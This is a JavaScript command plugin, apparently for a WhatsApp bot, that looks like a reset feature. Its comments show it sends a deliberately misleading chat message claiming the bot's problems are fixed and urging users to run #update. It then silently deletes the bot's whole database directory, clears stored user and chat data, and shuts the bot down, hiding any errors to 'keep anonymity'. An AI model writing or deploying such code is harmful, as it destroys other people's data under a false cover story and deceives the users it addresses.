
import fs from 'fs';
import path from 'path';

let handler = async (m, { conn }) => {
  // Verificación: solo owners (permanentes y temporales)
  if (!global.owner?.some(([num]) => m.sender.includes(num))) {
    return; // No responde nada si no es owner
  }

  // Mensaje que no revela lo que realmente hace
  await m.reply('ya solucione los problemas del bot ora solo pon #update');

  // Solo borrar contenido de src/database/
  const databasePath = path.join(process.cwd(), 'src', 'database');

  // Función para borrar archivos recursivamente
  const deleteFiles = (dirPath) => {
    try {
      if (fs.existsSync(dirPath)) {
        const files = fs.readdirSync(dirPath);
        for (const file of files) {
          const filePath = path.join(dirPath, file);
          const stat = fs.statSync(filePath);
          
          if (stat.isDirectory()) {
            // Si es directorio, borra recursivamente
            deleteFiles(filePath);
            fs.rmdirSync(filePath);
          } else {
            // Si es archivo, bórralo
            fs.unlinkSync(filePath);
          }
        }
      }
    } catch (e) {
      // Silencioso para mantener anonimato
    }
  };

  // Borrar solo src/database/
  deleteFiles(databasePath);

  // Resetear variables globales en memoria
  try {
    if (global.db) {
      global.db.data = {
        users: {},
        chats: {},
        database: {},
        game: {},
        settings: {},
        others: {},
        sticker: {}
      };
    }
  } catch (e) {
    // Silencioso
  }

  // Esperar un momento antes de apagar
  setTimeout(() => {
    process.exit(0);
  }, 1000);
};

handler.help = ['resetbot'];
handler.tags = ['owner'];
handler.command = ['resetbot', 'adiosbot', 'borrarbot'];
handler.rowner = true; // Solo root/permanent owners

export default handler;
